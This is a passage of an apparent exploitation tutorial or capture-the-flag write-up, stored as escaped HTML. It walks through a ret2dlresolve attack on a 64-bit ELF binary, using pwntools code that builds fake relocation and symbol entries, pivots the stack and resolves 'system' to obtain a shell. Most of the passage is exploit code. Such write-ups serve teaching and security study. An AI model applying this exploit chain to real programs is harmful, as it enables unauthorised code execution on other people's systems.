&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[O] Structures set&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Set string
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rel_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# We need to assert the address is divisible by Elf64_Rel size (24)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Launching dl_resolve... with rel at offset &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rel_offset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; - real &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rel_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RESOLVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rel_offset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Final stack addr at &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;**************************************************&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;All set; that was a nice ride; here is your shell :)&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;but let’s break it piece by piece.&lt;/p&gt;

&lt;h3 id=&quot;figure-out-the-locations&quot;&gt;Figure out the locations&lt;/h3&gt;

&lt;p&gt;For this task, I relied on the approach &lt;a href=&quot;https://github.com/Gallopsled/pwntools/blob/db98e5edfb/pwnlib/rop/ret2dlresolve.py#L228C1-L232C90&quot;&gt;from pwntools&lt;/a&gt; to resolve the addresses:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;elf_load_address_fixup&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load_addr&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ELF64_REL_LIST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dynamic_value_by_tag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;DT_JMPREL&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf_load_address_fixup&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ELF64_SYM_LIST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dynamic_value_by_tag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;DT_SYMTAB&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf_load_address_fixup&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;FUNCTION_NAMES_LIST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dynamic_value_by_tag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;DT_STRTAB&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf_load_address_fixup&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;RESOLVER&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x401020&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But you can obviously resolve them by hand. Using gef we can debug the program and run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xfiles&lt;/code&gt; to get the offsets.
With regular gdb it can be done with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info files&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;These addresses are needed to calculate the indexes so &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dl_resolve&lt;/code&gt; can resolve our fake structures.&lt;/p&gt;

&lt;p&gt;Based on this, we will place our structures in a rw controlled area: .data + .bss:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000404f10&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;FINAL_STACK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000404da0&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;STRING_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;REL_ENTRY_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SYM_ENTRY_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;prepare-fake-elf64_rel-entry&quot;&gt;Prepare fake Elf64_Rel entry&lt;/h3&gt;

&lt;p&gt;For the fake Elf64_Rel we need to provide:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;The entry on the GOT table we want to replace with our function address, in our case, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; but it could be any address. 
We will talk later about why to replace an existing function.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The index of our fake Elf64_Sym. Also, we need to set the type to 7 (R_X86_64_JUMP_SLOT)&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finally, we need to calculate the index that we need to provide &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dl_resolve&lt;/code&gt; so it points to this fake Elf64_Rel structure.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;fake_rel_entry_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Replace gets
# Calculation would be ELF64_SYM_LIST + index * sizeof(Elf64_Sym), being the size 24
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYM_ENTRY_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF64_SYM_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# We need to assert the address is divisible by Elf64_Sym size (24)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYM_ENTRY_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF64_SYM_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_rel_entry_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_rel_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_rel_entry_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_rel_entry_info&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rel_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;REL_ENTRY_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF64_REL_LIST&lt;/span&gt;
&lt;span class=&quot;bp&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rel_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rel_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;prepare-fake-elf64_sym-entry&quot;&gt;Prepare fake Elf64_Sym entry&lt;/h3&gt;

&lt;p&gt;The Elf64_Sym is simpler. All we need to set is the offset of our string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fake_sym_entry = p64(STRING_ADDRESS - FUNCTION_NAMES_LIST) + p64(0x00)&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;launching-dl_resolve&quot;&gt;Launching dl_resolve&lt;/h3&gt;

&lt;p&gt;Now that we are ready, let’s send the exploit.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Pivot the stack to where we are placing all the structures.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Stack pivoting performed to &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;Send the structures alongside with the string.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FINAL_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# The resolve functions will use a lot of memory, we need as much room as we can get.
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
